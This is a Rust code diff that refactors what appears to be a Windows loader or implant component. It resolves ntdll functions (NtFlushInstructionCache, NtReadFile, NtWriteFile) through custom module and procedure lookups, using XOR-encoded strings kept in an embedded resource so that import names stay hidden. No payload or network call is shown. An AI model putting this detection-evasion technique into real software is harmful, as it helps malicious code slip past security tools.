@@ -10,6 +10,7 @@ use crate::consts::{
 use crate::util::get_resource_bytes;
 use crate::windows::kernel32::{GetModuleHandleX, GetProcAddressX};
 use core::arch::global_asm;
+use crate::resource::XORString;
 
 pub type FnDllMain =
     extern "stdcall" fn(hinstDLL: usize, dwReason: u32, lpReserved: *mut usize) -> i32;
@@ -384,20 +385,8 @@ _get_peb:
 
 pub unsafe fn NtFlushInstructionCache(hProcess: usize, lpBaseAddress: usize, dwSize: u32) {
     let ntFlushInstructionCache: FnNtFlushInstructionCache = core::mem::transmute(GetProcAddressX(
-        GetModuleHandleX(
-            get_resource_bytes(RESOURCE_ID, NTDLL_DLL_POS, NTDLL_DLL_LEN),
-            get_resource_bytes(RESOURCE_ID, NTDLL_DLL_KEY, NTDLL_DLL_LEN),
-        ),
-        get_resource_bytes(
-            RESOURCE_ID,
-            NTFLUSHINSTRUCTIONCACHE_POS,
-            NTFLUSHINSTRUCTIONCACHE_LEN,
-        ),
-        get_resource_bytes(
-            RESOURCE_ID,
-            NTFLUSHINSTRUCTIONCACHE_KEY,
-            NTFLUSHINSTRUCTIONCACHE_LEN,
-        ),
+        GetModuleHandleX(&XORString::from_offsets(NTDLL_DLL_POS, NTDLL_DLL_KEY, NTDLL_DLL_LEN)),
+        &XORString::from_offsets(NTFLUSHINSTRUCTIONCACHE_POS, NTFLUSHINSTRUCTIONCACHE_KEY, NTFLUSHINSTRUCTIONCACHE_LEN),
     ));
 
     ntFlushInstructionCache(hProcess, lpBaseAddress, dwSize)
@@ -415,12 +404,8 @@ pub unsafe fn NtReadFile(
     Key: *const u32,
 ) -> i32 {
     let ntReadFile: FnNtReadFile = core::mem::transmute(GetProcAddressX(
-        GetModuleHandleX(
-            get_resource_bytes(RESOURCE_ID, NTDLL_DLL_POS, NTDLL_DLL_LEN),
-            get_resource_bytes(RESOURCE_ID, NTDLL_DLL_KEY, NTDLL_DLL_LEN),
-        ),
-        get_resource_bytes(RESOURCE_ID, NTREADFILE_POS, NTREADFILE_LEN),
-        get_resource_bytes(RESOURCE_ID, NTREADFILE_KEY, NTREADFILE_LEN),
+        GetModuleHandleX(&XORString::from_offsets(NTDLL_DLL_POS, NTDLL_DLL_KEY, NTDLL_DLL_LEN)),
+        &XORString::from_offsets(NTREADFILE_POS, NTREADFILE_KEY, NTREADFILE_LEN),
     ));
 
     ntReadFile(
@@ -448,12 +433,8 @@ pub unsafe fn NtWriteFile(
     Key: *const u32,
 ) -> i32 {
     let ntWriteFile: FnNtWriteFile = core::mem::transmute(GetProcAddressX(
-        GetModuleHandleX(
-            get_resource_bytes(RESOURCE_ID, NTDLL_DLL_POS, NTDLL_DLL_LEN),
-            get_resource_bytes(RESOURCE_ID, NTDLL_DLL_KEY, NTDLL_DLL_LEN),
-        ),
-        get_resource_bytes(RESOURCE_ID, NTWRITEFILE_POS, NTWRITEFILE_LEN),
-        get_resource_bytes(RESOURCE_ID, NTWRITEFILE_KEY, NTWRITEFILE_LEN),
+        GetModuleHandleX(&XORString::from_offsets(NTDLL_DLL_POS, NTDLL_DLL_KEY, NTDLL_DLL_LEN)),
+        &XORString::from_offsets(NTWRITEFILE_POS, NTWRITEFILE_KEY, NTWRITEFILE_LEN),
     ));
 
     ntWriteFile(
